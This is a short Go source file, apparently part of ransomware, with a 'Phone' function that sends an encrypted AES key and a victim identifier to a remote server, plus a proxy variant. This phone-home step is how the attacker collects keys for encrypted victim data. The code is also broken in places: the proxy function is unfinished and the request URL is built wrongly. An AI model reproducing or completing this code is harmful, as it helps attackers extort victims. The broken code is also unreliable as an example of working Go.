// Package home contains useful functions for reaching out to remote servers on
// the internet
package home

import (
	"net/http"
	"net/url"
	"time"

	"golang.org/x/net/proxy"
)

// Phone makes a connection to a http server somewhere on the internet and
// transmits the encrypted AES key along with some identifying information.
func Phone(u, uid, key string) (err error) {
	v, err := url.ParseQuery(u)
	if err != nil {
		return
	}
	v.Add("uid", uid)
	v.Add("key", key)

	resp, err := http.Get(v.Encode())
	if err != nil {
		return
	}
	return resp.Body.Close()
}

func PhoneProxy(p, u, uid, key string) (err error) {
	dialer, err := proxy.FromURL(p, proxy.Dialer)
	if err != nil {
		return
	}
	return
}
